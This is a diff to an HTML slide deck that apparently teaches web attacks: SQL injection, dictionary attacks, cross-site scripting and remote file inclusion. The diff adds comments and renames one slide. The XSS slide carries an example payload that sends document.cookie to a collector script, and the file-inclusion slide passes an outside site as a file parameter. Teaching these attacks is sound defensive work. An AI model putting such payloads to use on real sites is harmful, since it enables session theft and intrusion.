@@ -1,4 +1,5 @@
 <div class="section" id="section1">
+	<!-- First slide deals with SQL Injection -->
 	<div class="slide slide01 slides">
 		<div class="slide-sql">
 			<h1>SQL Injections</h1>
@@ -7,6 +8,7 @@
 		</div>
 
 	</div>
+	<!-- Second slide deals with Dictionary Attack -->
 	<div class="slide slide02 slides">
 		<div class="slide-dictionary">
 			<h1>Dictionary Attack</h1>
@@ -14,6 +16,7 @@
 			<pre>Example : English Dictionary with 263 533 words</pre>
 		</div>
 	</div>
+	<!-- Third slide deals with XSS attack -->
 	<div class="slide slide03 slides">
 		<div class="slide-xss">
 			<h1>Cross-site Scripting XSS</h1>
@@ -21,9 +24,10 @@
 			<pre>Example : window.location="http://127.0.0.1/securitytesting/xssattack/xss.php?c="+document.cookie;</pre>
 		</div>
 	</div>
+	<!-- Fourth slide deals with Remote File Inlclusion Attack -->
 	<div class="slide slide04 slides">
 		<div class="slide-include">
-			<h1>Include Attack</h1>
+			<h1>Remote File Inclusion Attack</h1>
 			<p>This issue is caused when an application builds a path to executable code using an attacker-controlled variable in a way that allows the attacker to control which file is executed at run time</p>
 			<pre>Example : window.location = "http://127.0.0.1/securitytesting/?file=www.monSite.fr/"</pre>
 		</div>
